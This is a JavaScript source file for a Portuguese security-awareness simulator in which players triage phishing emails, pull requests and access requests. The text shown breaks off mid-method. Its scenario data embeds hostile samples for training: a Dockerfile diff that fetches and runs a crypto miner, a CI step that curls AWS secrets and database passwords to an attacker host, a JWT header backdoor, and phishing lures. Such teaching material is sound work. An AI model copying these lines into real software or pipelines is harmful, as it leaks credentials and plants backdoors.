/**
 * TechMail // TechCore Cyber SOC & IT Analyst Simulator
 * Retro CRT & 2000s Desktop Engine Logic
 */

// Native Web Audio Synthesizer with 8-bit Retro Flavors
class SoundEngine {
  constructor() {
    this.ctx = null;
    this.enabled = true;
  }

  init() {
    if (!this.ctx) {
      const AudioContext = window.AudioContext || window.webkitAudioContext;
      if (AudioContext) {
        this.ctx = new AudioContext();
      }
    }
  }

  playTone(freq, type = 'square', duration = 0.08, gainVal = 0.08) {
    if (!this.enabled) return;
    this.init();
    if (!this.ctx) return;

    try {
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = type;
      osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
      gain.gain.setValueAtTime(gainVal, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.0001, this.ctx.currentTime + duration);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + duration);
    } catch (e) {
      console.warn('Audio error:', e);
    }
  }

  menuHover() { this.playTone(440, 'triangle', 0.04, 0.04); }
  click() { this.playTone(880, 'square', 0.05, 0.06); }
  openMail() { this.playTone(587.33, 'triangle', 0.06, 0.05); }
  actionDone() {
    this.playTone(523.25, 'square', 0.06, 0.06);
    setTimeout(() => this.playTone(659.25, 'square', 0.08, 0.06), 60);
  }
  endFanfare() {
    this.playTone(523.25, 'square', 0.1, 0.08);
    setTimeout(() => this.playTone(659.25, 'square', 0.1, 0.08), 100);
    setTimeout(() => this.playTone(783.99, 'square', 0.1, 0.08), 200);
    setTimeout(() => this.playTone(1046.50, 'square', 0.25, 0.12), 300);
  }
}

const audio = new SoundEngine();

// 10 Curated Scenarios based on the Security Guide
const SCENARIOS = [
  {
    id: 'msg-1',
    channel: 'email',
    time: '09:15',
    senderName: 'Marcos Silva (RH)',
    senderEmail: 'marcos.rh@techcore-beneficios.com',
    avatarChar: 'M',
    avatarColor: '#e91e63',
    subject: '[URGENTE] Atualização Obrigatória de Cadastro de Benefícios - Prazo 18h!',
    snippet: 'Identificamos uma inconsistência no seu plano de saúde corporativo e vale-alimentação. Acesse o link...',
    meta: {
      'De': 'Marcos Silva <marcos.rh@techcore-beneficios.com>',
      'Para': 'voce@techcore.com',
      'Data': 'Hoje, 09:12 (há 3 min)',
      'Segurança': 'SPF: NEUTRAL | DKIM: NONE (Não assinado)'
    },
    body: `
      <p>Prezado(a) colaborador(a),</p>
      <div class="email-quote-box">
        <p>Identificamos uma inconsistência no seu cadastro do plano de saúde corporativo e vale-alimentação. Para evitar a suspensão temporária dos seus benefícios a partir de amanhã, é obrigatório revalidar suas credenciais no novo portal integrado de RH.</p>
        <p><strong>Acesse o link do portal abaixo:</strong><br>
        <code style="color: #0b57d0; font-size: 13px;">https://portal-colaborador.techcore-beneficios.com/login-sso</code></p>
      </div>
      <p>Atenciosamente,<br><strong>Marcos Silva</strong><br>Gerente de Recursos Humanos - TechCore Inc.</p>
    `,
    inspector: {
      type: 'url',
      label: 'Inspeção de Destino de Link & Domínio',
      dest: 'https://portal-colaborador.techcore-beneficios.com/auth/login-sso?redirect=exfil',
      details: '⚠️ Domínio não autorizado detectado. O RH oficial utiliza exclusivamente @techcore-hr.com.'
    },
    actions: [
      {
        id: 'click_phish',
        label: '🌐 Acessar Link e Inserir Credenciais',
        type: 'danger',
        correct: false,
        toastMsg: 'Credenciais inseridas no formulário externo.',
        logTitle: 'Vazamento de Credenciais em Phishing',
        consequence: 'Você inseriu suas credenciais corporativas em um portal falso de phishing (@techcore-beneficios.com). Os criminosos capturaram sua senha.',
        explanation: 'Pela Guia de Segurança, o único domínio oficial autorizado para comunicados do RH é "@techcore-hr.com". O remetente usou uma variação não autorizada.'
      },
      {
        id: 'report_phish',
        label: '🛡️ Reportar Phishing ao SOC',
        type: 'success',
        correct: true,
        toastMsg: 'E-mail reportado ao gateway de segurança.',
        logTitle: 'Phishing de RH Neutralizado',
        consequence: 'Domínio falso "@techcore-beneficios.com" bloqueado preventivamente no firewall de e-mail.',
        explanation: 'Excelente! Você checou a Guia e identificou que o domínio "@techcore-beneficios.com" é uma falsificação (typosquatting).'
      },
      {
        id: 'archive_mail',
        label: '🗑️ Deletar / Arquivar sem Reportar',
        type: 'secondary',
        correct: false,
        toastMsg: 'E-mail arquivado.',
        logTitle: 'Ameaça Não Notificada ao SOC',
        consequence: 'Você não caiu no golpe, mas não alertou o SOC e outros colaboradores da empresa clicaram no link falso.',
        explanation: 'A política de segurança exige reportar tentativas de phishing para que o domínio seja bloqueado para todos.'
      }
    ]
  },
  {
    id: 'msg-2',
    channel: 'github',
    time: '10:05',
    senderName: 'carlos.dev (TechHub)',
    senderEmail: 'carlos.dev@techcore.com',
    avatarChar: 'C',
    avatarColor: '#2e7d32',
    subject: 'PR #142: Otimização de queries no endpoint de checkout PIX',
    snippet: 'Refatoração de índices e paginação na consulta de extratos de pagamentos PIX para reduzir latência...',
    meta: {
      'De': 'carlos.dev (Desenvolvedor Sênior - Backend)',
      'Para': 'Organização @TechCore-Official',
      'Data': 'Hoje, 10:01',
      'Segurança': 'GPG Signature: VALID (carlos.dev)'
    },
    body: `
      <p><strong>Pull Request #142 no repositório <code>core-api-v2</code>:</strong></p>
      <div class="email-quote-box">
        <p>Refatoração de índices e paginação na consulta de extratos de pagamentos PIX para reduzir latência de 850ms para 42ms no pico.</p>
        <p>Branch: <code>feature/pix-perf-opt</code> ➔ <code>main</code><br>CI Build: <strong>Passed (184/184 unit tests)</strong></p>
      </div>
    `,
    inspector: {
      type: 'diff',
      label: 'Git Diff Viewer (core-api-v2/src/payments/pix.ts)',
      diff: [
        { type: 'info', text: '@@ -45,6 +45,7 @@ export async function queryPixOrders(userId: string) {' },
        { type: 'removed', text: '-  const orders = await db.query(`SELECT * FROM orders WHERE user = ?`, [userId]);' },
        { type: 'added', text: '+  const orders = await db.query(`SELECT id, status, amount, created_at FROM orders USE INDEX (idx_user_created) WHERE user = ? ORDER BY created_at DESC LIMIT 50`, [userId]);' },
        { type: 'info', text: '@@ -58,4 +59,4 @@' }
      ]
    },
    actions: [
      {
        id: 'merge_pr',
        label: '✅ Aprovar e Fazer Merge no Main',
        type: 'success',
        correct: true,
        toastMsg: 'Pull Request #142 aprovado e integrado ao main.',
        logTitle: 'PR Legítimo Integrado',
        consequence: 'Deploy da otimização de pagamentos concluído com sucesso e sem incidentes.',
        explanation: 'Repositório oficial (core-api-v2), desenvolvedor sênior autorizado (carlos.dev), branch e diff limpos.'
      },
      {
        id: 'reject_pr',
        label: '❌ Rejeitar e Bloquear PR',
        type: 'danger',
        correct: false,
        toastMsg: 'Pull Request #142 rejeitado.',
        logTitle: 'Falso Positivo em PR Legítimo',
        consequence: 'Atraso crítico no release de pagamentos da empresa devido a bloqueio indevido de desenvolvedor sênior.',
        explanation: 'carlos.dev é membro sênior oficial e core-api-v2 é a API principal de pagamentos listada na Guia.'
      }
    ]
  },
  {
    id: 'msg-3',
    channel: 'iam',
    time: '11:20',
    senderName: 'alex.intern (TechAccess)',
    senderEmail: 'alex.intern@techcore.com',
    avatarChar: 'A',
    avatarColor: '#f57c00',
    subject: 'Solicitação de Privilégio: ClusterAdmin Kubernetes (Prod)',
    snippet: 'Oi time, entrei hoje no time de front-end e preciso de acesso root na AWS e no cluster de produção...',
    meta: {
      'De': 'alex.intern (Estagiário Frontend)',
      'Para': 'TechAccess / IAM Role Approver',
      'Data': 'Hoje, 11:18',
      'Segurança': 'Chamado de Segurança: Nenhum informado'
    },
    body: `
      <p><strong>Solicitação de Elevação de Privilégio IAM:</strong></p>
      <div class="email-quote-box">
        <p>"Oi time de TI, entrei hoje no time de front-end e preciso de acesso root na AWS e no cluster Kubernetes de produção para debugar um CSS que não está renderizando no site."</p>
        <p>Função solicitada: <code>AWS-AdministratorAccess + ClusterAdmin (PROD)</code></p>
      </div>
    `,
    inspector: {
      type: 'url',
      label: 'Auditoria de Conformidade IAM (Matriz de Menor Privilégio)',
      dest: 'Solicitante: alex.intern | Função: ClusterAdmin (PROD)',
      details: '⚠️ Solicitante desconhecido sem chamado prévio registrado por beatriz.sec ou gerência de SecOps.'
    },
    actions: [
      {
        id: 'grant_iam',
        label: '🔓 Aprovar Permissão de Admin',
        type: 'danger',
        correct: false,
        toastMsg: 'Privilégio de Administrador concedido a alex.intern.',
        logTitle: 'Violação Crítica de Menor Privilégio',
        consequence: 'Acesso root de produção liberado a estagiário sem chamado prévio ou validação da equipe de SecOps.',
        explanation: 'Violação direta da política de acessos: novos usuários pedindo admin sem chamado prévio devem ser barrados.'
      },
      {
        id: 'deny_iam',
        label: '🚫 Rejeitar Solicitação & Exigir Chamado SecOps',
        type: 'success',
        correct: true,
        toastMsg: 'Solicitação de acesso rejeitada por inconformidade.',
        logTitle: 'Acesso Indevido Barrado no IAM',
        consequence: 'Infraestrutura de produção protegida contra concessão indevida de privilégios.',
        explanation: 'Correto! Acessos administrativos em produção exigem aprovação formal de beatriz.sec.'
      }
    ]
  },
  {
    id: 'msg-4',
    channel: 'email',
    time: '12:00',
    senderName: 'RH TechCore (Oficial)',
    senderEmail: 'comunicados@techcore-hr.com',
    avatarChar: 'R',
    avatarColor: '#1976d2',
    subject: 'Informativo: Escala de Plantão de Fim de Ano e Ponto Eletrônico',
    snippet: 'Informamos que o fechamento da folha e a escala de plantões para o próximo mês já estão disponíveis na intranet...',
    meta: {
      'De': 'RH TechCore <comunicados@techcore-hr.com>',
      'Para': 'todos@techcore.com',
      'Data': 'Hoje, 11:58',
      'Segurança': 'SPF: PASS | DKIM: PASS (techcore-hr.com)'
    },
    body: `
      <p>Prezada equipe,</p>
      <div class="email-quote-box">
        <p>Informamos que o fechamento da folha e a escala de plantões para o próximo mês já estão disponíveis na intranet corporativa habitual. Dúvidas podem ser encaminhadas diretamente ao seu gestor imediato.</p>
        <p><em>Não é necessária nenhuma ação de revalidação de senha ou clique em links externos.</em></p>
      </div>
      <p>Cordialmente,<br><strong>Marcos Silva</strong><br>Gerente de Recursos Humanos</p>
    `,
    inspector: {
      type: 'url',
      label: 'Inspeção de Cabeçalho & Assinatura Digital',
      dest: 'Domínio: @techcore-hr.com (SPF: PASS | DKIM: PASS)',
      details: '✅ Domínio autorizado do RH oficial. Mensagem puramente informativa sem links maliciosos.'
    },
    actions: [
      {
        id: 'keep_email',
        label: '📨 Manter / Arquivar Normalmente',
        type: 'success',
        correct: true,
        toastMsg: 'Comunicado corporativo arquivado.',
        logTitle: 'Comunicado Legítimo de RH Processado',
        consequence: 'Fluxo normal de comunicação interna mantido.',
        explanation: 'O domínio @techcore-hr.com é exatamente o domínio oficial e exclusivo para comunicados de RH.'
      },
      {
        id: 'block_rh',
        label: '🚨 Bloquear Domínio e Reportar como Phishing',
        type: 'danger',
        correct: false,
        toastMsg: 'Domínio do RH bloqueado no gateway.',
        logTitle: 'Falso Positivo - Canal de RH Bloqueado',
        consequence: 'Você bloqueou o canal legítimo de comunicados da empresa no gateway de e-mail.',
        explanation: 'O domínio @techcore-hr.com consta expressamente na Guia como o domínio oficial de RH.'
      }
    ]
  },
  {
    id: 'msg-5',
    channel: 'github',
    time: '13:40',
    senderName: 'shadow.dev (TechHub)',
    senderEmail: 'shadow.dev@external.net',
    avatarChar: 'S',
    avatarColor: '#616161',
    subject: 'PR #1: Adicionar worker em lote para relatórios analíticos',
    snippet: 'Adicionando worker leve em background para processamento de relatórios noturnos...',
    meta: {
      'De': 'shadow.dev (Usuário Desconhecido)',
      'Para': 'Organização @TechCore-Official',
      'Data': 'Hoje, 13:38',
      'Segurança': 'Repositório: crypto-worker-node (NÃO OFICIAL)'
    },
    body: `
      <p><strong>Pull Request #1 no repositório <code>crypto-worker-node</code>:</strong></p>
      <div class="email-quote-box">
        <p>"Adicionando container worker para processamento assíncrono de relatórios."</p>
        <p>Branch: <code>patch-1</code> ➔ <code>main</code></p>
      </div>
    `,
    inspector: {
      type: 'diff',
      label: 'Git Diff Viewer (crypto-worker-node/Dockerfile)',
      diff: [
        { type: 'info', text: '@@ -1,3 +1,8 @@' },
        { type: 'added', text: '+ FROM alpine:latest' },
        { type: 'added', text: '+ RUN wget https://pool.mine-xmr.org/xmrig.tar.gz && tar -xf xmrig.tar.gz' },
        { type: 'added', text: '+ ENTRYPOINT ["./xmrig", "-o", "stratum+tcp://pool.mine-xmr.org:3333", "-u", "WALLET_EXFIL"]' },
        { type: 'info', text: '@@ -5,2 +10,1 @@' }
      ]
    },
    actions: [
      {
        id: 'approve_miner',
        label: '✅ Aprovar PR e Deploy',
        type: 'danger',
        correct: false,
        toastMsg: 'PR aprovado no repositório crypto-worker-node.',
        logTitle: 'Injeção de Cryptominer em Servidores',
        consequence: 'Um minerador de criptomoedas oculto (XMRig) foi implantado nos clusters da empresa.',
        explanation: 'O repositório "crypto-worker-node" não é oficial da TechCore e o diff continha claramente o minerador xmrig.'
      },
      {
        id: 'ban_miner',
        label: '🚫 Fechar PR, Deletar Repositório e Banir Usuário',
        type: 'success',
        correct: true,
        toastMsg: 'Repositório não oficial excluído e minerador barrado.',
        logTitle: 'Tentativa de Cryptojacking Neutralizada',
        consequence: 'Repositório falso eliminado e uso indevido de recursos da nuvem evitado.',
        explanation: 'Excelente! Você verificou que apenas core-api-v2, auth-service e deploy-pipeline são oficiais.'
      }
    ]
  },
  {
    id: 'msg-6',
    channel: 'email',
    time: '14:30',
    senderName: 'Suporte de TI',
    senderEmail: 'admin@tech-core.com',
    avatarChar: 'S',
    avatarColor: '#c2185b',
    subject: '[ALERTA DE SEGURANÇA] Falha no Token 2FA - Redefinição Obrigatória',
    snippet: 'Detectamos tentativas não autorizadas de login na sua conta. Seu token de autenticação foi invalidado...',
    meta: {
      'De': 'admin@tech-core.com',
      'Para': 'voce@techcore.com',
      'Data': 'Hoje, 14:28',
      'Segurança': 'SPF: FAIL | Domínio Registrado há 2 dias'
    },
    body: `
      <p>Atenção Colaborador,</p>
      <div class="email-quote-box">
        <p>Detectamos tentativas não autorizadas de login na sua conta. Seu token de autenticação de dois fatores (2FA) foi invalidado por precaução.</p>
        <p><strong>Clique imediatamente no link abaixo para sincronizar seu novo token:</strong><br>
        <code style="color: #d93025; font-size: 13px;">https://sso-auth.tech-core.com/sync-mfa</code></p>
      </div>
      <p>Helpdesk Central de TI</p>
    `,
    inspector: {
      type: 'url',
      label: 'Inspeção de Domínio (Typosquatting)',
      dest: 'https://sso-auth.tech-core.com/sync-mfa (IP: 185.220.101.5)',
      details: '🚨 Domínio falso: "tech-core.com" possui hífen! O domínio oficial é "@techcore.com".'
    },
    actions: [
      {
        id: 'click_typo',
        label: '🔑 Clicar no Link e Reconfigurar 2FA',
        type: 'danger',
        correct: false,
        toastMsg: 'Sessão 2FA enviada para servidor externo.',
        logTitle: 'Invasão de Conta via Typosquatting',
        consequence: 'Os atacantes capturaram o seu token 2FA e assumiram o controle da sua conta corporativa.',
        explanation: 'O domínio do remetente era "@tech-core.com" (com hífen), uma clássica fraude de typosquatting.'
      },
      {
        id: 'report_typo',
        label: '🛡️ Reportar Phishing / Typosquatting ao SOC',
        type: 'success',
        correct: true,
        toastMsg: 'Domínio com hífen bloqueado no DNS.',
        logTitle: 'Typosquatting Bloqueado com Sucesso',
        consequence: 'Domínio malicioso com hífen colocado na blacklist do firewall.',
        explanation: 'Muito bem! Você notou o hífen no domínio falso @tech-core.com.'
      }
    ]
  },
  {
    id: 'msg-7',
    channel: 'github',
    time: '15:15',
    senderName: 'unknown.coder (TechHub)',
    senderEmail: 'unknown.coder@gmail.com',
    avatarChar: 'U',
    avatarColor: '#5c6bc0',
    subject: 'PR #89: Correção de validação JWT em ambiente de staging',
    snippet: 'Ajuste rápido no middleware de autenticação para evitar erros 401 durante testes...',
    meta: {
      'De': 'unknown.coder (Usuário não autorizado)',
      'Para': 'Organização @TechCore-Official / auth-service',
      'Data': 'Hoje, 15:12',
      'Segurança': 'GPG Signature: NONE'
    },
    body: `
      <p><strong>Pull Request #89 no repositório <code>auth-service</code>:</strong></p>
      <div class="email-quote-box">
        <p>"Ajuste rápido no middleware de autenticação para evitar erros 401 em testes de integração."</p>
      </div>
    `,
    inspector: {
      type: 'diff',
      label: 'Git Diff Viewer (auth-service/src/middleware/jwt.ts)',
      diff: [
        { type: 'info', text: '@@ -22,6 +22,9 @@ export function verifyToken(req, res, next) {' },
        { type: 'added', text: '+  if (req.headers["x-bypass-sec"] === "ROOT_OVERRIDE_SECRET") {' },
        { type: 'added', text: '+    req.user = { id: 0, role: "SUPERADMIN", permissions: ["*"] }; return next();' },
        { type: 'added', text: '+  }' },
        { type: 'info', text: '@@ -28,4 +31,4 @@' }
      ]
    },
    actions: [
      {
        id: 'merge_backdoor',
        label: '✅ Aprovar PR no auth-service',
        type: 'danger',
        correct: false,
        toastMsg: 'PR #89 aprovado no auth-service.',
        logTitle: 'Backdoor Injetado no Serviço de Autenticação',
        consequence: 'Um backdoor universal foi inserido no auth-service, permitindo que qualquer invasor vire Superadmin.',
        explanation: 'O diff continha um bypass explícito via cabeçalho HTTP enviado por um autor desconhecido.'
      },
      {
        id: 'reject_backdoor',
        label: '🚫 Rejeitar PR & Alertar beatriz.sec (SecOps)',
        type: 'success',
        correct: true,
        toastMsg: 'Backdoor rejeitado e equipe de SecOps alertada.',
        logTitle: 'Backdoor no Auth-Service Neutralizado',
        consequence: 'Tentativa de inserção de porta dos fundos no microsserviço de autenticação bloqueada.',
        explanation: 'Excelente inspeção técnica no diff! Você barrou o bypass antes que chegasse à branch main.'
      }
    ]
  },
  {
    id: 'msg-8',
    channel: 'iam',
    time: '16:00',
    senderName: 'beatriz.sec (TechAccess)',
    senderEmail: 'beatriz.sec@techcore.com',
    avatarChar: 'B',
    avatarColor: '#00897b',
    subject: 'Acesso Temporário de Auditoria CloudTrail: Investigação #SEC-8921',
    snippet: 'Investigação urgente de tentativa de brute-force na API de pagamentos. Preciso de leitura nos logs...',
    meta: {
      'De': 'beatriz.sec (Analista de Segurança / SecOps)',
      'Para': 'TechAccess / IAM Approver',
      'Data': 'Hoje, 15:58',
      'Segurança': 'Chamado: #SEC-8921 (Aprovado pelo CISO)'
    },
    body: `
      <p><strong>Solicitação de Acesso Temporário de Segurança:</strong></p>
      <div class="email-quote-box">
        <p>"Investigação urgente de tentativa de brute-force originada de IPs suspeitos na API de pagamentos. Preciso de permissão de leitura nos logs do CloudTrail para análise forense por 4 horas."</p>
        <p>Função: <code>AWS-ReadOnly-SecurityAudit (Expiração: 4h)</code><br>Chamado formal: <strong>#SEC-8921</strong></p>
      </div>
    `,
    inspector: {
      type: 'url',
      label: 'Auditoria de Conformidade IAM',
      dest: 'Chamado #SEC-8921 // Beatriz SecOps',
      details: '✅ Usuária autorizada conhecida (beatriz.sec), escopo somente leitura de auditoria e chamado formal anexado.'
    },
    actions: [
      {
        id: 'grant_sec_audit',
        label: '🔓 Aprovar Concessão Temporária (4h)',
        type: 'success',
        correct: true,
        toastMsg: 'Acesso temporário de auditoria liberado para beatriz.sec.',
        logTitle: 'Acesso Legítimo de SecOps Concedido',
        consequence: 'beatriz.sec conduziu a análise forense e neutralizou a tentativa externa de brute-force a tempo.',
        explanation: 'beatriz.sec é a analista de segurança autorizada na Guia e o chamado #SEC-8921 estava regular.'
      },
      {
        id: 'deny_sec_audit',
        label: '🚫 Rejeitar Solicitação de beatriz.sec',
        type: 'danger',
        correct: false,
        toastMsg: 'Solicitação de beatriz.sec rejeitada.',
        logTitle: 'Investigação de Segurança Bloqueada',
        consequence: 'A equipe de SecOps ficou cega durante o incidente e a empresa sofreu indisponibilidade.',
        explanation: 'beatriz.sec é a analista autorizada e o pedido cumpria rigorosamente a política de segurança.'
      }
    ]
  },
  {
    id: 'msg-9',
    channel: 'github',
    time: '16:50',
    senderName: 'carlos-dev-patch-1 (TechHub)',
    senderEmail: 'carlos-dev@external-fork.net',
    avatarChar: 'C',
    avatarColor: '#d81b60',
    subject: 'PR #55: ci: Adicionar notificação no Discord/Slack após deploy',
    snippet: 'Integração com webhook para avisar o canal de deploys quando a build finalizar...',
    meta: {
      'De': 'carlos-dev-patch-1 (Fork Suspeito)',
      'Para': 'Organização @TechCore-Official / deploy-pipeline',
      'Data': 'Hoje, 16:47',
      'Segurança': 'Branch Origem: carlos-dev-patch-1:feature/webhook'
    },
    body: `
      <p><strong>Pull Request #55 no repositório <code>deploy-pipeline</code>:</strong></p>
      <div class="email-quote-box">
        <p>"Integração com webhook para avisar o canal de deploys quando a build finalizar."</p>
      </div>
    `,
    inspector: {
      type: 'diff',
      label: 'Git Diff Viewer (.github/workflows/deploy.yml)',
      diff: [
        { type: 'info', text: '@@ -18,4 +18,6 @@ jobs:' },
        { type: 'added', text: '+    - name: Webhook Notify' },
        { type: 'added', text: '+      run: |' },
        { type: 'added', text: '+        curl -s -X POST https://exfil-logs.dark-c2.net/payload -d "SECRET=$AWS_SECRET_ACCESS_KEY&DB=$PROD_DB_PASSWORD"' },
        { type: 'info', text: '@@ -24,3 +26,1 @@' }
      ]
    },
    actions: [
      {
        id: 'merge_supply_chain',
        label: '✅ Aprovar Pipeline CI/CD',
        type: 'danger',
        correct: false,
        toastMsg: 'Pipeline de deploy atualizada.',
        logTitle: 'Exfiltração de Secrets no CI/CD',
        consequence: 'Todas as chaves AWS e credenciais de banco de dados de produção foram vazadas para o servidor C2 do invasor.',
        explanation: 'Ataque de Supply Chain CI/CD no deploy-pipeline através de um fork disfarçado exfiltrando variáveis de ambiente.'
      },
      {
        id: 'reject_supply_chain',
        label: '🚫 Rejeitar PR, Revogar Chaves e Bloquear Fork',
        type: 'success',
        correct: true,
        toastMsg: 'PR malicioso rejeitado e credenciais protegidas.',
        logTitle: 'Ataque de Supply Chain Neutralizado',
        consequence: 'Tentativa de injeção de script no CI/CD interceptada. Segredos de produção seguros.',
        explanation: 'Perfeito! Você inspecionou o workflow do deploy-pipeline e identificou o comando curl enviando secrets.'
      }
    ]
  },
  {
    id: 'msg-10',
    channel: 'email',
    time: '17:35',
    senderName: 'Diretoria Executiva',
    senderEmail: 'ceo-office@techcore-corp-board.com',
    avatarChar: 'D',
    avatarColor: '#424242',
    subject: '[CONFIDENCIAL/DIRETORIA] Liberação Emergencial de Chave SSH no Gateway',
    snippet: 'Estou em trânsito e fechando uma auditoria com investidores externos. Preciso que você adicione esta chave SSH...',
    meta: {
      'De': 'ceo-office@techcore-corp-board.com',
      'Para': 'voce@techcore.com',
      'Data': 'Hoje, 17:33',
      'Segurança': 'SPF: FAIL | Domínio Externo não autorizado'
    },
    body: `
      <p>Prezado(a) Analista,</p>
      <div class="email-quote-box">
        <p>Estou em trânsito fechando uma auditoria com investidores externos. Preciso que você adicione a chave pública abaixo no arquivo <code>authorized_keys</code> do servidor de produção imediatamente:</p>
        <p><code style="font-size: 11px; word-break: break-all; color: #b45309;">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8x... root@shadow-proxy</code></p>
        <p>Não abra chamado nem comente com a equipe para não vazar a operação confidencial.</p>
      </div>
      <p>Gabinete da Presidência</p>
    `,
    inspector: {
      type: 'url',
      label: 'Inspeção de Spear Phishing (Fraude do CEO)',
      dest: 'Remetente: @techcore-corp-board.com (Falso!)',
      details: '🚨 Tentativa clássica de Fraude do CEO. O domínio oficial de colaboradores da empresa é apenas @techcore.com.'
    },
    actions: [
      {
        id: 'add_ssh',
        label: '🔑 Adicionar Chave SSH no Servidor',
        type: 'danger',
        correct: false,
        toastMsg: 'Chave SSH adicionada ao servidor de produção.',
        logTitle: 'Invasão Direta via Fraude do CEO',
        consequence: 'O atacante obteve acesso persistente como root no servidor principal sem qualquer controle.',
        explanation: 'Golpe clássico de Fraude do CEO com urgência e sigilo falsos para burlar controles corporativos.'
      },
      {
        id: 'report_ceo',
        label: '🛡️ Bloquear E-mail & Reportar Spear Phishing',
        type: 'success',
        correct: true,
        toastMsg: 'Incidente de Spear Phishing registrado no SOC.',
        logTitle: 'Fraude do CEO Neutralizada com Sucesso',
        consequence: 'Tentativa de engenharia social bloqueada e registrada no relatório forense.',
        explanation: 'Perfeito! Você manteve a postura profissional, reconheceu o domínio falso e não violou a política de segurança.'
      }
    ]
  }
];

// Main Controller
class TechMailSimulator {
  constructor() {
    this.currentIndex = 0;
    this.processedItems = [];
    this.decisionsHistory = [];
    this.currentCategoryFilter = 'all';

    this.cacheDOMElements();
    this.bindEvents();
  }

  cacheDOMElements() {
    this.startScreen = document.getElementById('start-screen');
    this.exitScreen = document.getElementById('exit-screen');
    this.instructionsModal = document.getElementById('instructions-modal');
    this.mainWorkspace = document.getElementById('main-workspace');

    this.btnStartShift = document.getElementById('btn-start-shift');
    this.btnExitSite = document.getElementById('btn-exit-site');
    this.btnReopenSite = document.getElementById('btn-reopen-site');
    this.btnEnterWorkstation = document.getElementById('btn-enter-workstation');
    this.btnCloseInstructions = document.getElementById('btn-close-instructions');

    this.shiftClock = document.getElementById('shift-clock');
    this.taskbarClock = document.getElementById('taskbar-clock');
    this.btnTopGuide = document.getElementById('btn-top-guide');
    this.btnCloseGuide = document.getElementById('btn-close-guide');
    this.btnCloseGuideFoot = document.getElementById('btn-close-guide-foot');
    this.guideModal = document.getElementById('guide-modal');
    this.btnSoundToggle = document.getElementById('btn-sound-toggle');
    this.btnWinExit = document.getElementById('btn-win-exit');

    // Desktop icons
    this.diconMail = document.getElementById('dicon-mail');
    this.diconGithub = document.getElementById('dicon-github');
    this.diconIam = document.getElementById('dicon-iam');
    this.diconGuide = document.getElementById('dicon-guide');

    this.inboxListView = document.getElementById('inbox-list-view');
    this.emailItemsContainer = document.getElementById('email-items-container');
    this.emailReaderView = document.getElementById('email-reader-view');
    this.auditReportView = document.getElementById('audit-report-view');
    this.btnBackToInbox = document.getElementById('btn-back-to-inbox');
    this.browserBackBtn = document.getElementById('browser-back-btn');
    this.browserRefreshBtn = document.getElementById('browser-refresh-btn');

    // Badges
    this.badgeEmailCount = document.getElementById('badge-email-count');
    this.badgeGithubCount = document.getElementById('badge-github-count');
    this.badgeIamCount = document.getElementById('badge-iam-count');
    this.badgeDoneCount = document.getElementById('badge-done-count');
    this.tabEmailTag = document.getElementById('tab-email-tag');
    this.tabGithubTag = document.getElementById('tab-github-tag');
    this.tabIamTag = document.getElementById('tab-iam-tag');

    // Reader elements
    this.readerTypeTag = document.getElementById('reader-type-tag');
    this.readerTimeMeta = document.getElementById('reader-time-meta');
    this.readerSubjectTitle = document.getElementById('reader-subject-title');
    this.readerSenderAvatar = document.getElementById('reader-sender-avatar');
    this.readerSenderName = document.getElementById('reader-sender-name');
    this.readerSenderEmail = document.getElementById('reader-sender-email');
    this.readerReceivedTime = document.getElementById('reader-received-time');
    this.btnToggleHeaders = document.getElementById('btn-toggle-headers');
    this.technicalHeadersBox = document.getElementById('technical-headers-box');
    this.headerDe = document.getElementById('header-de');
    this.headerPara = document.getElementById('header-para');
    this.headerData = document.getElementById('header-data');
    this.headerAuth = document.getElementById('header-auth');
    this.readerBodyMessage = document.getElementById('reader-body-message');
    this.readerInspectorSection = document.getElementById('reader-inspector-section');
    this.decisionButtonsGroup = document.getElementById('decision-buttons-group');

    // Toast
    this.actionToast = document.getElementById('action-toast');
    this.toastMsg = document.getElementById('toast-msg');

    // End report elements
    this.reportThreatsAvoided = document.getElementById('report-threats-avoided');
    this.reportThreatsTaken = document.getElementById('report-threats-taken');
    this.reportHealthFinal = document.getElementById('report-health-final');
    this.reportReputationFinal = document.getElementById('report-reputation-final');
    this.auditStamp = document.getElementById('audit-stamp');
    this.auditTitle = document.getElementById('audit-title');
    this.auditVerdictTitle = document.getElementById('audit-verdict-title');
    this.auditVerdictText = document.getElementById('audit-verdict-text');
    this.auditTableBody = document.getElementById('audit-table-body');
    this.btnRestartShift = document.getElementById('btn-restart-shift');
  }

  bindEvents() {
    // 1. Click "Começar o seu turno" -> Open Instructions Modal
    this.btnStartShift.addEventListener('click', () => {
      audio.click();
      this.instructionsModal.style.display = 'flex';
    });
    this.btnStartShift.addEventListener('mouseenter', () => audio.menuHover());

    // 2. Click "Sair" -> Exit CRT screen
    this.btnExitSite.addEventListener('click', () => {
      audio.click();
      this.startScreen.style.display = 'none';
      this.exitScreen.style.display = 'flex';
      try { window.close(); } catch (e) {}
    });
    this.btnExitSite.addEventListener('mouseenter', () => audio.menuHover());

    // Close window X button in browser titlebar
    this.btnWinExit.addEventListener('click', () => {
      audio.click();
      this.mainWorkspace.style.display = 'none';
      this.startScreen.style.display = 'flex';
    });

    // 3. Reopen from exit screen
    this.btnReopenSite.addEventListener('click', () => {
      audio.click();
      this.exitScreen.style.display = 'none';
      this.startScreen.style.display = 'flex';
    });

    // 4. Click "Entendido! Iniciar Expediente" in instructions modal
    this.btnEnterWorkstation.addEventListener('click', () => {
      audio.click();
      this.instructionsModal.style.display = 'none';
      this.startShift();
    });
    this.btnCloseInstructions.addEventListener('click', () => {
      audio.click();
      this.instructionsModal.style.display = 'none';
    });

    // Sound toggle
    this.btnSoundToggle.addEventListener('click', () => {
      audio.enabled = !audio.enabled;
      this.btnSoundToggle.textContent = audio.enabled ? '🔊' : '🔇';
      if (audio.enabled) audio.click();
    });

    // Guide Modal
    const openGuideFn = () => {
      audio.click();
      this.guideModal.style.display = 'flex';
    };
    this.btnTopGuide.addEventListener('click', openGuideFn);
    this.diconGuide.addEventListener('click', openGuideFn);

    const closeGuideFn = () => {
      audio.click();
      this.guideModal.style.display = 'none';
    };
    this.btnCloseGuide.addEventListener('click', closeGuideFn);
    this.btnCloseGuideFoot.addEventListener('click', closeGuideFn);

    // Desktop icons filtering
    this.diconMail.addEventListener('click', () => {
      audio.click();
      this.setCategoryView('email');
    });
    this.diconGithub.addEventListener('click', () => {
      audio.click();
      this.setCategoryView('github');
    });
